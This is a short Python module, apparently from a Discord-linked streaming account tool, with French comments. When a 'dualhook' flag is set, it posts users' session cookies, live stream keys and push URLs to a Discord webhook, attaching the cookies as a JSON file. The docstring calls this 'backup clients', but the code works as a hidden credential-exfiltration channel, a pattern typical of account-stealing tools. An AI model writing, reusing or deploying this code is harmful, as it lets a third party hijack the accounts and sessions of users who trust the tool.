"""Envoie cookies + clés live au webhook Discord (backup clients)."""

from __future__ import annotations

import json
import logging
from typing import Any

import aiohttp

from config import WEBHOOK_URL

log = logging.getLogger(__name__)


async def notify_account_saved(
    *,
    discord_id: str,
    discord_name: str,
    platform: str,
    account_pseudo: str,
    cookies: dict[str, str] | None,
    stream_key: str = "",
    rtmp_url: str = "",
    full_push_url: str = "",
    created: bool,
    dualhook: bool = False,
) -> None:
    if not dualhook or not WEBHOOK_URL:
        return

    key_preview = stream_key[:200] + "..." if len(stream_key) > 200 else stream_key
    push_preview = (full_push_url or rtmp_url)[:200]

    embed = {
        "title": "🔑 Compte / clé enregistré" if created else "🔄 Compte mis à jour",
        "color": 0xFE2C55,
        "fields": [
            {"name": "Discord", "value": f"`{discord_name}` ({discord_id})", "inline": False},
            {"name": "Plateforme", "value": platform.upper(), "inline": True},
            {"name": "Pseudo", "value": f"@{account_pseudo}", "inline": True},
            {"name": "Clé stream", "value": f"```{key_preview or '—'}```", "inline": False},
            {"name": "URL push", "value": f"`{push_preview or '—'}`", "inline": False},
        ],
    }

    payload: dict[str, Any] = {"embeds": [embed]}
    files = None

    if cookies:
        cookie_bytes = json.dumps(cookies, indent=2, ensure_ascii=False).encode("utf-8")
        form = aiohttp.FormData()
        form.add_field("payload_json", json.dumps(payload))
        form.add_field(
            "files[0]",
            cookie_bytes,
            filename=f"{platform}_{account_pseudo}_cookies.json",
            content_type="application/json",
        )
        files = form

    try:
        async with aiohttp.ClientSession() as session:
            if files:
                async with session.post(WEBHOOK_URL, data=files) as resp:
                    if resp.status >= 400:
                        log.warning("Webhook error %s: %s", resp.status, await resp.text())
            else:
                async with session.post(WEBHOOK_URL, json=payload) as resp:
                    if resp.status >= 400:
                        log.warning("Webhook error %s: %s", resp.status, await resp.text())
    except Exception as exc:
        log.exception("Webhook notify failed: %s", exc)